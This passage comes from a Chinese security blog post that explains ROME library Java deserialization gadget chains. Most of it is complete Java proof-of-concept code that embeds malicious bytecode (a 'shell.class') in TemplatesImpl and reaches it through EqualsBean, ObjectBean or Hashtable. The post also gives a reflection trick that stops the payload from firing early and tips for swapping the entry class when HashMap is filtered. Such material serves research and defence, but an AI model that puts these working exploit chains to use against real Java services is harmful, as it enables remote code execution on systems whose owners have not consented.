    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span>  obj<span class="token punctuation">,</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ROME_2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这块能正常执行代码，但会存在一个问题，我在执行的时候会触发两次执行命令，一次是在 22 行的位置触发，第二次会在反序列化的时候触发。在 22 行触发后你每跟进一次，都会触发一次，最后上网搜到后发现是我的调试环境配置得有问题，修改回来之后发现还是会触发两次，最后发现是之前 cc1 中碰到的那个，就是你 put 的时候不能直接把类 put 进去，而是要反射进行修改，才不会在序列化的时候也触发 payload。最后经过修改后的 payload 如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">DoubleExp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">EqualsBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ROME_3</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 创建 TemplatesImpl 对象并设置恶意字节码</span>
        <span class="token class-name">TemplatesImpl</span> tmpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\DoubleExp\\shell.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytecodes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>tmpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建 ToStringBean 和 EqualsBean 对象</span>
        <span class="token class-name">ToStringBean</span> tsb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tmpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">EqualsBean</span> ebean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> tsb<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建 HashMap 并插入无害对象作为占位符</span>
        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> harmlessPlaceholder <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>harmlessPlaceholder<span class="token punctuation">,</span> <span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 直接在 main 方法中使用反射替换无害对象为 ebean</span>
        <span class="token class-name">Field</span> tableField <span class="token operator">=</span> <span class="token class-name">HashMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"table"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tableField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> table <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> tableField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Object</span> entry <span class="token operator">:</span> table<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>entry <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">Field</span> keyField <span class="token operator">=</span> entry<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                keyField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>keyField<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>entry<span class="token punctuation">)</span> <span class="token operator">==</span> harmlessPlaceholder<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    keyField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>entry<span class="token punctuation">,</span> ebean<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 序列化和反序列化</span>
        <span class="token function">serialize</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ROME_2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ROME_2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就解决了在 put 的时候会进行调用的问题</p>
<h3 id="其他利用链"><a href="#其他利用链" class="headerlink" title="其他利用链"></a>其他利用链</h3><p>在其他的利用链中，后半段大致都相同，都是通过 TemplatesImpl.getOutputProperties()来进行任意类加载，有变化的都是其他位置</p>
<h4 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h4><p>这个类中的 hashcode 中调用了 beanHashCode 方法，然后在 EqualsBean 中的 beanHashCode 方法中调用了 toString 方法，跟直接利用 EqualsBean 类中的 hashCode 方法来调用 beanHashCode 方法是一个意思</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731060574578-9f1835fb-78da-4285-9b98-4b9124df1915.png"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731060863064-4450e446-97a4-46ea-8465-c932979e0c1c.png"></p>
<p>其余都一样，最后代码如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">DoubleExp</span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ROME_ObjectBEN</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> templatesimpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\DoubleExp\\shell.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setValue</span><span class="token punctuation">(</span>templatesimpl<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templatesimpl<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>bytecodes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templatesimpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>templatesimpl<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span> <span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">serialize</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ROME_ObjectBEN.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ROME_ObjectBEN.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h4 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h4><p>这条链并不单单针对的 ROME 链，这个的作用是替换反序列化的入口类 HashMap 类，如果 HashMap 被过滤了，我们就能用这个来进行替换，类似的还有 HashSet 也是能进行替换</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731214438921-21e934d6-c296-41b8-b619-a6a154b0688c.png"></p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731214494611-5bcf70db-9bed-40bd-b5a9-8371ffdc45a7.png"></p>
<p>最终依旧能够调用到 hashCode，能够正常的触发。</p>
<p>最终代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">DoubleExp</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ObjectBean</span></span><span class="token punctuation">;</span>
